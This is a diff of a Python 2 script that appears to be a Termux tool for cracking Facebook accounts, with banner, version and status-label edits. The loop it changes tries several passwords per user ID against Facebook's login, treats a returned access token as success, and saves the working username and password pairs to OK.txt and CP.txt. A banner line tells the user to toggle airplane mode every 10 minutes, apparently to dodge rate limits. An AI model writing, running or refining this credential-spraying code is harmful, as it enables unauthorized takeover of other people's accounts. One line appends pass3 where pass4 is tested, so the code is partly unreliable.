@@ -142,7 +142,7 @@ logo = """
 
 \x1b[1;94m\033[1;96mGitHub   :             Sohail-302
 
-\x1b[1;95m\033[1;96mVersion  :              Number PRO
+\x1b[1;95m\033[1;96mVersion  :              1.0.2
 
 \x1b[1;90m__________________________________________________
 
@@ -240,7 +240,7 @@ def action():
 
     print logo
 
-    jalan ('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')
+    jalan ('\x1b[1;92mUse CP id Open 7,10 Day,  termux check every 10 minutes  later. airplane mode use every 10 mint.')
 
     print(47*'-')
 
@@ -272,7 +272,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;96m  [Sohail_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;96m  [Sohail OK]  ' + k + c + user + '  |  ' + pass1
 
                 okb = open('save/CP.txt', 'a')
 
@@ -282,7 +282,7 @@ def action():
 
                 oks.append(c + user + pass1)
 
-            elif 'www.facebook.com' in q['error_msg']:
+            elif 'free.facebook.com' in q['error_msg']:
 
                 print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass1
 
@@ -304,7 +304,7 @@ def action():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;96m  [Sohail_Temp_Lock] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;96m  [Sohail OK] ' + k + c + user + '  |  ' + pass2
 
                     okb = open('save/OK.txt', 'a')
 
@@ -314,7 +314,7 @@ def action():
 
                     oks.append(c + user + pass2)
 
-                elif 'www.facebook.com' in q['error_msg']:
+                elif 'free.facebook.com' in q['error_msg']:
 
                     print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass2
 
@@ -336,7 +336,7 @@ def action():
 
                     if 'access_token' in q:
 
-                        print '\x1b[1;96m  [Sohail_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;98m  [Sohail OK]  ' + k + c + user + '  |  ' + pass3
 
                         okb = open('save/CP.txt', 'a')
 
@@ -346,7 +346,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                    elif 'www.facebook.com' in q['error_msg']:
+                    elif 'free.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass3
 
@@ -368,7 +368,7 @@ def action():
 
                        if 'access_token' in q:
 
-                        print '\x1b[1;96m  [Sohail_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
+                        print '\x1b[1;98m  [Sohail OK]  ' + k + c + user + '  |  ' + pass4
 
                         okb = open('save/CP.txt', 'a')
 
@@ -378,7 +378,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                       elif 'www.facebook.com' in q['error_msg']:
+                       elif 'free.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass4
 
